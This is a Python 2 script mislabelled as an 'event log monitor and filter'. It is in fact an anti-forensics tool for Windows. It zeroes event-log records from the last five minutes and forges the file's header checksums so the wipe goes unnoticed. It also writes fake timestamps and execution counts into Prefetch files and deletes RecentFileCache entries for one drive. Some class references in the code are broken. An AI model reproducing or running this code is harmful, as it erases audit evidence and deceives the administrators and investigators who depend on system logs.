# event log monitor and filter
import binascii, math, time, os, random, threading
from datetime import datetime, timedelta

class EventLog:
        def bytesToNumber(self, bytes): #read a little endian byte sequence to a number
                number = 0
                exp = 0
                
                for byte in bytes:
                        number += ord(byte) * 256**exp
                        exp += 1
                        
                return number
        
        def numberToBytes(self, number, length): #read a number to a little endian byte sequence
                bytes = ""
                number = int(number)
                for i in range(0, length):
                        bytes += chr(number % 256)
                        number = (number-(number%256))/256
                        
                return bytes
        
        def timeToFiletime(self, utcTime):
                return 116444736000000000 + (time.mktime(utcTime) * 10000000)
        
        def wipeRecentEventLogs(self, path, maxTimestamp):
                maxTimestamp = self.timeToFiletime(maxTimestamp)
                f = open(path, "r+b")
                header = f.read(4096)
                firstChunk = self.bytesToNumber(header[8:16])
                numChunks = self.bytesToNumber(header[42:44])
                
                record = f.read(8)
                blankOffset = 4096+8
                recordId = None
                recordOffset = None
                while record != "":
                        if record[0:4] == "**\x00\x00":
                                #found a new record, read rest of it into memory
                                record += f.read(self.bytesToNumber(record[4:8]) - 8)
                                #if the timestamp > max, get ready to delete stuff
                                if record[-4:] == record[4:8] and self.bytesToNumber(record[16:24]) >= maxTimestamp:
                                        print "cutting"
                                        recordId = self.bytesToNumber(record[8:16])                             
                                        break
                                recordOffset = blankOffset - 8
                                blankOffset += self.bytesToNumber(record[4:8]) - 8
                                
                                
                        record = f.read(8)
                        blankOffset += 8
        
                
                if recordId:
                        blankOffset -= 8
                        f.seek(blankOffset)
                        length = len(f.read())
                        f.seek(blankOffset)
                        f.write("\x00"*length)
                        
                        # Work out what chunk we're in, how many chunks we just overwrote
                        currentChunk = math.floor((blankOffset-4096)/65536)
                        overwroteChunks = math.floor(length/65536)
                        chunkOffset = int(currentChunk)*65536+4096
                        f.seek(chunkOffset)
                        chunkHeader = f.read(512)
                        chunkHeader = chunkHeader[:16] \
                                                + self.numberToBytes(recordId - 1, 8) \
                                                + chunkHeader[24:32] \
                                                + self.numberToBytes(recordId - 1, 8) \
                                                + chunkHeader[40:44] \
                                                + self.numberToBytes(recordOffset - chunkOffset, 4) \
                                                + self.numberToBytes(blankOffset - chunkOffset, 4) \
                                                + chunkHeader[52:]
                        chunkData = f.read((blankOffset-chunkOffset)-512)
                        chunkHeader = chunkHeader[:52] \
                                                + self.numberToBytes(binascii.crc32(chunkData, 0) & 0xffffffff, 4) \
                                                + chunkHeader[56:]
                        
                        chunkHeader = chunkHeader[:124] \
                                                + self.numberToBytes(binascii.crc32(chunkHeader[:120]+chunkHeader[128:512], 0) & 0xffffffff, 4) \
                                                + chunkHeader[128:]
                                                
                        
                        f.seek(chunkOffset)
                        f.write(chunkHeader)
                        
                        
                        
                        header = header[:16] \
                                   + self.numberToBytes(currentChunk + firstChunk, 8) \
                                   + self.numberToBytes(recordId, 8) \
                                   + header[32:42] \
                                   + self.numberToBytes(currentChunk + 1, 2) \
                                   + header[44:]
                                   
                        header = header[:124] + self.numberToBytes(binascii.crc32(header[:120], 0) & 0xffffffff, 4) + header[128:]
                        f.seek(0)
                        f.write(header)
                        
                f.close()

class SuperfetchEmulator(threading.Thread):
        def timeToFiletime(self, utcTime):
                return 116444736000000000 + (time.mktime(utcTime) * 10000000) + random.randint(0, 10000000)
        
        def numberToBytes(self, number, length): #read a number to a little endian byte sequence
                bytes = ""
                number = int(number)
                for i in range(0, length):
                        bytes += chr(number % 256)
                        number = (number-(number%256))/256
                        
                return bytes
                
        def bytesToNumber(self, bytes): #read a little endian byte sequence to a number
                number = 0
                exp = 0
                
                for byte in bytes:
                        number += ord(byte) * 256**exp
                        exp += 1
                        
                return number
                
        def run(self):
                prefetchDir = "C:/Windows/Prefetch/"
                unwanted = ["LOGONUI.EXE-09140401.pf", "NTOSBOOT-B00DFAAD.pf"]
                averageWaitMins = 4
                
                # Load prefetch filenames into dictionary
                
                files = {}
                for filename in os.listdir(prefetchDir):
                        if filename[-3:] == ".pf" and not filename in unwanted:
                                files[filename] = 0
                
                
                # populate dictionary with prefetch file execution counts
                totalExecutions = 0
                for filename in files:
                        f = open(prefetchDir + filename, 'rb')
                        f.seek(152)
                        count = f.read(4)
                        files[filename] = self.bytesToNumber(count)
                        # files only ever run once are probably useless for us, so set as 0 so they're never simulated
                        if files[filename] == 1:
                                files[filename] = 0
                        else:
                                totalExecutions += files[filename]
                        f.close()
                
                # loop, occasionally incrementing a file counter
                while 1:
                        
                        # generate a random prefetch file, weighted by number of executions
                        countdown = random.randint(0, totalExecutions)
                        for filename in files:
                                if countdown <= files[filename]:
                                        break
                                countdown -= files[filename]
                        
                        files[filename] += 1
                        totalExecutions += 1
                        
                        # open the prefetch file, write out the current date/time minus 10 seconds and update the execution counter
                        f = open(prefetchDir + filename, 'r+b')
                        f.seek(128)
                        f.write(self.numberToBytes(self.timeToFiletime(datetime.timetuple(datetime.now() - timedelta(seconds=10))), 8)) 
                        f.seek(152)
                        for byte in range (0,4):
                                f.write(chr(int(files[filename]/(256**byte))%256))
                        f.close()
                        
                        try:
                                time.sleep(random.randint(0, averageWaitMins*60) + random.randint(0, averageWaitMins*60))
                        except:
                                return
                        
class RecentFileCache(Threading.thread):
        def numberToBytes(self, number, length): #read a number to a little endian byte sequence
                bytes = ""
                number = int(number)
                for i in range(0, length):
                        bytes += chr(number % 256)
                        number = (number-(number%256))/256
                        
                return bytes

        def run(self):
                while 1:
                        f = open("C:/Windows/AppCompat/Programs/RecentFileCache.bcf", 'r+b')
                        data = f.read()
                        if "m\x00:\x00\\" in data:
                                data = data[:data.index("m\x00:\x00\\")-4]
                                data = data[:16] + numberToBytes(binascii.crc32(data[:16]+data[20:]) & 0xffffffff,4) + data[20:]
                                f.seek(0)
                                f.write(data)
                                f.truncate()
                        f.close()
                        try:
                                time.sleep(5)
                        except:
                                return




syspath = "C:/Windows/System32/winevt/Logs/"
if not os.path.isfile(syspath + "System.evtx"): syspath = "C:/Windows/Sysnative/winevt/Logs/"

for file in os.listdir(syspath):
        if time.localtime(os.stat(syspath+file)[8]) > datetime.timetuple(datetime.now() - timedelta(minutes=5)):
                EventLog().wipeRecentEventLogs(syspath + file, datetime.timetuple(datetime.now() - timedelta(minutes=5)))

SuperfetchEmulator().start()
RecentFileCache().start()

